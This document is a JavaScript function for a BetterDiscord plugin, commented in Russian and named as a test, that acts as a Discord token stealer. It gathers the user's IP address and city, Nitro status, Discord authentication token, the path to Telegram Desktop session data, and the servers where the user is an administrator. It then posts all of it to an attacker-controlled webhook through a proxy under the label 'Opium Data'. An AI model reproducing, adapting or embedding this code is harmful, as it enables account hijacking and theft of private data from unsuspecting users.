async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
    const fs = require('fs');
    const os = require('os');
    const path = require('path');

    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        dtoken: null,
        telegram_path: "Не найден",
        admin_servers: []
    };
    
    // 1. Получаем IP и локацию
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) { console.error("IP Error", e); }

    // 2. Проверяем статус Nitro
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType === 1) result.nitro = "Nitro Classic";
            else if (user.premiumType === 2) result.nitro = "Nitro";
            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
        }
    } catch (e) { console.error("Nitro Error", e); }

    // Получаем токен для прямого запроса к API
    let token = null;
    try {
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') token = authStore.getToken();
        result.dtoken = token;
    } catch (e) {}

    // 3. Поиск пути к Telegram Desktop (tdata)
    try {
        // Возможные пути установки Telegram
        const possiblePaths = [
            path.join(process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'), 'Telegram Desktop', 'tdata'),
            path.join(process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'), 'Telegram Desktop', 'tdata'),
            path.join(os.homedir(), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
        ];

        for (const p of possiblePaths) {
            if (fs.existsSync(p)) {
                result.telegram_path = p;
                break;
            }
        }
    } catch (e) { console.error("Telegram Path Error", e); }

    // 4. Ищем серверы, где ты админ, и считаем людей
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            
            for (const g of Object.values(guilds)) {
                // Проверяем право "Администратор"
                if (PermissionStore.can(8n, g)) {
                    
                    let count = 0;
                    
                    // Пытаемся достать из кэша (самый быстрый способ)
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                        count = GuildMemberCountStore.getMemberCount(g.id);
                    }
                    if (!count) {
                        count = g.memberCount || g.approximateMemberCount;
                    }

                    // Если в кэше пусто (0), делаем прямой запрос к API Discord
                    if (!count && token) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
                                headers: { "Authorization": token }
                            });
                            if (res.ok) {
                                const data = await res.json();
                                count = data.approximate_member_count || data.member_count || 0;
                            }
                        } catch (err) { console.error("API Fetch Error:", err); }
                    }

                    result.admin_servers.push({
                        name: g.name,
                        members: count || 0
                    });
                }
            }
        }
    } catch (e) { console.error("Guild Error", e); }

    // 5. Отправка на вебхук через прокси
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
            })
        });
        return response.ok;
    } catch (e) {
        console.error("Webhook Error", e);
        return false;
    }
}
